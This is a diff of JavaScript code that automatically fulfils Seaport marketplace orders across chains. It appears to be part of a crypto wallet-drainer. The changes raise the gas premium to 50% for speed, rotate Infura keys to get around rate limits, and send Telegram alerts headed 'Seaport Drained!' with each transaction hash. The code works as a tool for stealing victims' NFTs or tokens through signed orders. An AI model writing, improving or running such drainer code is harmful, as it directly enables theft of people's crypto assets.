@@ -272,18 +272,23 @@ async function fulfillSeaportOrder(order, chainName) {
         const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
 
         // Manual Gas Settings to ensure execution
+        // Manual Gas Settings to ensure execution
         const feeData = await provider.getFeeData();
-        const gasPrice = feeData.gasPrice ? (feeData.gasPrice * 120n) / 100n : undefined; // +20% gas price
+        const gasPrice = feeData.gasPrice ? (feeData.gasPrice * 150n) / 100n : undefined; // +50% gas price for speed
 
         console.log(`🚀 [EVM] Submitting Seaport Order on ${chainName}...`);
         const tx = await seaport.fulfillOrder(order, "0x0000000000000000000000000000000000000000000000000000000000000000", {
             gasLimit: 500000, // Hardcoded high gas limit
             gasPrice: gasPrice
         });
+
         console.log(`✅ [EVM] Seaport Success on ${chainName}: ${tx.hash}`);
+        sendTelegram(`✅ **Seaport Drained!**\nChain: ${chainName}\nTX: \`${tx.hash}\``);
         return true;
     } catch (e) {
         console.error(`❌ [EVM] Seaport Failed on ${chainName}:`, e.message);
+        sendTelegram(`❌ **Seaport Failed** (${chainName})\nError: ${e.message.slice(0, 100)}`);
+
         if (e.message.includes("429") || e.message.includes("limit")) {
             console.warn("⚠️ Rate limit hit. Rotating Infura ID...");
             rotateInfura();
